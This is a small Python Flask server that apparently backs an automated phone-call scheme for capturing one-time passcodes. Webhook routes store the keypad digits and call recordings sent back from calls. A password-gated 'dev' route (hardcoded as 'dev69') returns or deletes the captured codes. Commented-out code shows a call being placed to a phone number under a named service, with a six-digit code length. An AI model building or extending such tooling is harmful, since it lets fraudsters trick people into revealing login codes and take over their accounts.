from pprint import pprint
from flask import Flask, request, jsonify
# from otp import OTP

app = Flask(__name__)

class Database:
    active = {}
    digits = {
        "active": {}
    }

@app.route("/status")
def status():
    return "ok"

# @app.route("/otp/call")
# def call_otp():
#     call = OTP("+17472793908", "vast", 6, "pornhub")
#     call.make_call()
#     return "calling..."

@app.route("/dev/database", methods=['GET', 'DELETE'])
def re_database():
    if str(request.args.get("access")) == "dev69":     
        if request.method == "GET":
            return dict(Database.digits)
        if request.method == "DELETE":
            try:
                Database.digits.get("active").pop(request.args.get("diguuid"))
                return jsonify(result="True")
            except:
                return jsonify(result="False")
        


@app.route("/webhooks/digits", methods=['POST'])
def dtmf():
    Database.digits.get("active").update({str(request.args.get("key")): request.get_json()['dtmf']['digits']})
    return jsonify(request.get_json())

@app.route("/webhooks/recordings", methods=['POST'])
def record():
    print(request.get_json())
    return jsonify(request.get_json())


if __name__ == "__main__":
    app.run(host="0.0.0.0")